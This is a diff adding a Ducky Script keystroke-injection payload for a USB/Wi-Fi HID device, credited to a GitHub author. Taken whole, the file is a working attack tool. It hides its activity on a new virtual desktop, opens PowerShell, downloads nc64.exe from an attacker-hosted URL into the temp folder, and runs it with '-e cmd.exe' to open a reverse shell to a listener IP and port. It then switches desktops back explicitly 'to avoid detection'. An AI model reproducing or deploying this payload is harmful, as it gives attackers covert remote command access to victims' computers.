@@ -1,0 +1,35 @@
+REM Written by HonkinWaffles https://github.com/HonkinWaffles/Wi-Fi-Ducky-Scripts
+REM Description: Powershell and Netcat for reverse shell generation
+
+REM <HOSTED URL> - URL to where nc64.exe is hosted
+REM <IP_ADDR> - Change the IP to your listener IP
+REM <PORT>  - Port of listener
+
+DEFAULTDELAY 10
+
+REM Create and set new virtual desktop
+GUI CTRL d
+GUI CTRL RIGHTARROW
+DELAY 300
+
+REM Open Powershell
+GUI r
+DELAY 100
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Set path to remp 
+STRING $path = [System.IO.Path]::GetTempPath()
+SHIFT ENTER
+STRING Set-Location $path
+SHIFT ENTER
+REM Download nc64.exe
+STRING Invoke-Webrequest http://<HOSTED_URL>/nc64.exe -OutFile a.exe
+ENTER
+REM Connect to listener
+STRING ./a.exe <IP_ADDR> <PORT> -e cmd.exe -d
+ENTER
+
+REM Return to Orginal desktop to avoid detection
+GUI CTRL LEFTARROW
